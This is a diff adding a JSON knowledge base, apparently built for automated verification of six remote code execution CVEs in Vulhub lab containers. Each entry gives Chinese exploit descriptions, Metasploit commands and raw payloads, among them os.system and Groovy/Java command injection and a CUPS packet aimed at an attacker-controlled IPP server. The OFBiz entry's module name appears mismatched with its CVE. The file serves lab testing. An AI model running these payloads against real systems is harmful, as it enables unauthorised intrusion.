@@ -1,0 +1,143 @@
+{
+  "rag_summary": "漏洞 CVE-2025-3248 是 Langflow 平台中的未授权远程代码执行漏洞 (RCE)。攻击者可以通过向 /api/v1/validate/code 接口发送包含恶意 Python 代码的 POST 请求来触发该漏洞。该漏洞无需认证即可利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/langflow:1.2.0，默认运行在 7860 端口。可使用 Metasploit 模块 exploits/multi/http/langflow_unauth_rce_cve_2025_3248 进行验证。",
+  "name": "CVE-2025-3248",
+  "path": "langflow/CVE-2025-3248",
+  "image": "vulhub/langflow:1.2.0",
+  "contracts": {
+    "ingress": [7860],
+    "vuln_type": "rce"
+  },
+  "description": {
+    "exploit_method": "向Langflow的/api/v1/validate/code接口发送包含恶意装饰器或默认参数的Python函数定义，利用接口在使用exec执行函数定义时会解析执行装饰器和默认参数表达式的特性，实现未授权远程代码执行。",
+    "exploit_effect": "攻击者可在未授权的情况下，通过精心构造的代码实现对目标系统的任意代码执行，可能导致服务器被完全控制，包括但不限于获取系统信息、执行系统命令、篡改数据等。"
+  },
+  "poc_details": {
+    "type": "msf",
+    "module_path": "exploits/multi/http/langflow_unauth_rce_cve_2025_3248",
+    "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+    "command_example": "msfconsole -q -x 'use exploits/multi/http/langflow_unauth_rce_cve_2025_3248; set RHOSTS 127.0.0.1; set RPORT 7860; run; exit'",
+    "required_params": ["target_ip", "target_port"],
+    "is_auth_required": false,
+    "payload_example": "POST /api/v1/validate/code HTTP/1.1\nHost: target\nContent-Type: application/json\n\n{\"code\": \"import os; os.system('id')\"}"
+  }
+}
+
+{
+  "rag_summary": "漏洞 CVE-2025-32433 是 Erlang/OTP SSH 服务中的未授权远程代码执行漏洞 (RCE)。攻击者可以通过发送特制的 SSH_MSG_CHANNEL_REQUEST 协议包来触发该漏洞。该漏洞无需认证即可利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/erlang:27.3.2-with-ssh，默认运行在 2222 端口。可使用 Metasploit 模块 exploits/linux/ssh/ssh_erlangotp_rce 进行验证。",
+  "name": "CVE-2025-32433",
+  "path": "erlang/CVE-2025-32433",
+  "image": "vulhub/erlang:27.3.2-with-ssh",
+  "contracts": {
+    "ingress": [2222],
+    "vuln_type": "rce"
+  },
+  "description": {
+    "exploit_method": "通过发送特制的SSH_MSG_CHANNEL_REQUEST（消息编号94）协议包，利用Erlang/OTP SSH服务端处理缺陷，在未认证阶段执行任意系统命令。具体是构造包含恶意命令的符合RFC 4254定义结构的消息，其中包含"exec"请求及对应的命令字符串。",
+    "exploit_effect": "攻击者可在未进行身份认证的情况下远程执行任意系统命令，例如在目标系统中创建文件等操作，对系统安全性造成严重威胁。"
+  },
+  "poc_details": {
+    "type": "msf",
+    "module_path": "exploits/linux/ssh/ssh_erlangotp_rce",
+    "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+    "command_example": "msfconsole -q -x 'use exploits/linux/ssh/ssh_erlangotp_rce; set RHOSTS 127.0.0.1; set RPORT 2222; run; exit'",
+    "required_params": ["target_ip", "target_port"],
+    "is_auth_required": false,
+    "payload_example": "SSH_MSG_CHANNEL_REQUEST (94) packet with \"exec\" request type and boolean false, containing command string"
+  }
+}
+
+{
+  "rag_summary": "漏洞 CVE-2025-2945 是 pgAdmin4 中的远程代码执行漏洞 (RCE)。攻击者可以通过向 /sqleditor/query_tool/download 或 /cloud/deploy 接口注入恶意代码来触发该漏洞。该漏洞需要认证才能利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/pgadmin:9.1，默认运行在 5050 端口。可使用 Metasploit 模块 exploits/multi/http/pgadmin_query_tool_authenticated 进行验证。",
+  "name": "CVE-2025-2945",
+  "path": "pgadmin/CVE-2025-2945",
+  "image": "vulhub/pgadmin:9.1",
+  "contracts": {
+    "ingress": [5050],
+    "vuln_type": "rce"
+  }, 
+  "description": {
+    "exploit_method": "该漏洞存在于pgAdmin4的两个POST接口中：/sqleditor/query_tool/download接口的query_commited参数和/cloud/deploy接口的high_availability参数被不安全地传递给Python的eval函数，已认证的攻击者可通过向这些参数注入恶意代码来执行任意命令。利用时需先拥有pgAdmin4的登录凭据，且需要一个可访问的PostgreSQL数据库实例来初始化SQL编辑器。",
+    "exploit_effect": "攻击者可在服务器上执行任意代码，如创建文件、执行系统命令等，从而对服务器进行未授权操作，危害系统安全。"
+  },
+  "poc_details": {
+    "type": "msf",
+    "module_path": "exploits/multi/http/pgadmin_query_tool_authenticated",
+    "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+    "command_example": "msfconsole -q -x 'use exploits/multi/http/pgadmin_query_tool_authenticated; set RHOSTS 127.0.0.1; set RPORT 5050; run; exit'",
+    "required_params": ["target_ip", "target_port"],
+    "is_auth_required": true,
+    "payload_example": "POST /sqleditor/query_tool/download HTTP/1.1\\nContent-Type: application/json\\n\\n{\"sql\": \"SELECT 1\", \"query_commited\": \"import os; os.system('id')\"}"
+  }
+}
+
+{
+  "rag_summary": "漏洞 CVE-2024-47177 是 Cups-Browsed 中的远程代码执行漏洞 (RCE)。攻击者可以通过向目标发送恶意的 UDP 数据包（包含构造的打印机信息）来触发该漏洞。该漏洞无需认证即可利用，当存在打印任务时恶意命令将被执行。对应的 Vulhub 环境镜像为 vulhub/cups-browsed:2.0.1，默认运行在 631 端口。可使用 Metasploit 模块 exploits/multi/misc/cups_ipp_remote_code_execution 进行验证。",
+  "name": "CVE-2024-47177",
+  "path": "cups-browsed/CVE-2024-47177",
+  "image": "vulhub/cups-browsed:2.0.1",
+  "contracts": {
+    "ingress": [631],
+    "vuln_type": "rce"
+  },
+  "description": {
+    "exploit_method": "攻击者可通过搭建创建恶意IPP服务器，向易受攻击的Cups-Browsed实例发送包含精心构造的打印机信息（其中包含恶意payload的printer-privacy-policy-uri属性）的UDP数据包。Cups-Browsed接收后会生成包含payload的临时PPD文件，当存在打印任务（如用户正常打印或攻击者触发的打印测试页任务）时，注入的恶意命令将被执行。",
+    "exploit_effect": "攻击者可在运行易受攻击版本Cups-Browsed的系统上执行任意命令，获得系统权限，对目标系统的机密性、完整性和可用性造成严重威胁。"
+  },
+  "poc_details": {
+    "type": "msf",
+    "module_path": "exploits/multi/misc/cups_ipp_remote_code_execution",
+    "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+    "command_example": "msfconsole -q -x 'use exploits/multi/misc/cups_ipp_remote_code_execution; set RHOSTS 127.0.0.1; set RPORT 631; run; exit'",
+    "required_params": ["target_ip", "target_port"],
+    "is_auth_required": false,
+    "payload_example": "UDP Packet to port 631: \"0 3 http://<attacker_ip>:<port>/printers/NAME\""
+  }
+}
+
+{
+  "rag_summary": "漏洞 CVE-2024-38856 是 Apache OFBiz 中的未授权远程代码执行漏洞 (RCE)。攻击者可以通过向 /webtools/control/main/ProgramExport 接口发送包含恶意 Groovy 表达式的请求来触发该漏洞。该漏洞无需认证即可利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/ofbiz:18.12.14，默认运行在 8443 端口。可使用 Metasploit 模块 exploits/multi/http/apache_ofbiz_forgot_password_directory_traversal 进行验证。",
+  "name": "CVE-2024-38856",
+  "path": "ofbiz/CVE-2024-38856",
+  "image": "vulhub/ofbiz:18.12.14",
+  "contracts": {
+    "ingress": [8443,5005],
+    "vuln_type": "rce,auth_bypass"
+  },
+  "description": {
+    "exploit_method": "通过向/webtools/control/main/ProgramExport端点发送包含恶意Groovy表达式的POST请求，利用系统对CVE-2023-51467修复不完全导致的Groovy表达式注入漏洞。通过Unicode编码绕过关键词限制（如将execute编码为u0065xecute），注入可执行命令的Groovy脚本，实现远程代码执行，且无需授权验证即可利用。",
+    "exploit_effect": "未经授权的攻击者可通过该漏洞在服务器上执行任意命令，获取服务器权限，进而可能导致数据泄露、系统被篡改、服务中断等严重后果。"
+  },
+  "poc_details": {
+    "type": "msf",
+    "module_path": "exploits/multi/http/apache_ofbiz_forgot_password_directory_traversal",
+    "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+    "command_example": "msfconsole -q -x 'use exploits/multi/http/apache_ofbiz_forgot_password_directory_traversal; set RHOSTS 127.0.0.1; set RPORT 8443; run; exit'",
+    "required_params": ["target_ip", "target_port"],
+    "is_auth_required": false,
+    "payload_example": "POST /webtools/control/main/ProgramExport HTTP/1.1\\nContent-Type: application/x-www-form-urlencoded\\n\\ngroovyProgram=throw+new+Exception('whoami'.execute().text);"
+  }
+}
+
+{
+  "rag_summary": "漏洞 CVE-2024-36401 是 GeoServer 中的未授权远程代码执行漏洞 (RCE)。攻击者可以通过构造恶意的 OGC 请求（如包含恶意 XPath 表达式）来触发该漏洞。该漏洞无需认证即可利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/geoserver:2.23.2，默认运行在 8080 端口。可使用 Metasploit 模块 exploits/multi/http/geoserver_unauth_rce_cve_2024_36401 进行验证。",
+  "name": "CVE-2024-36401",
+  "path": "geoserver/CVE-2024-36401",
+  "image": "vulhub/geoserver:2.23.2",
+  "contracts": {
+    "ingress": [8080,5005],
+    "vuln_type": "rce,expression_injection"
+  },
+  "description": {
+    "exploit_method": "未登录的任意用户可通过构造恶意OGC请求（如WFS GetFeature、WFS GetPropertyValue、WMS GetMap等），在默认安装的服务器中执行XPath表达式，利用Apache Commons Jxpath功能执行任意代码。例如，通过GET方法访问/geoserver/wfs并携带包含恶意命令的valueReference参数，或通过POST方法发送包含恶意XPath表达式的XML数据。",
+    "exploit_effect": "成功利用可导致攻击者在目标服务器上执行任意命令，如创建文件等操作，获取服务器控制权，对系统安全造成严重威胁。"
+  },
+  "poc_details": {
+    "type": "msf",
+    "module_path": "exploits/multi/http/geoserver_unauth_rce_cve_2024_36401",
+    "command_template": "msfconsole -q -x 'use {module_path}; set RHOSTS {target_ip}; set RPORT {target_port}; run; exit'",
+    "command_example": "msfconsole -q -x 'use exploits/multi/http/geoserver_unauth_rce_cve_2024_36401; set RHOSTS 127.0.0.1; set RPORT 8080; run; exit'",
+    "required_params": ["target_ip", "target_port"],
+    "is_auth_required": false,
+    "payload_example": "GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success') HTTP/1.1"
+  }
+}
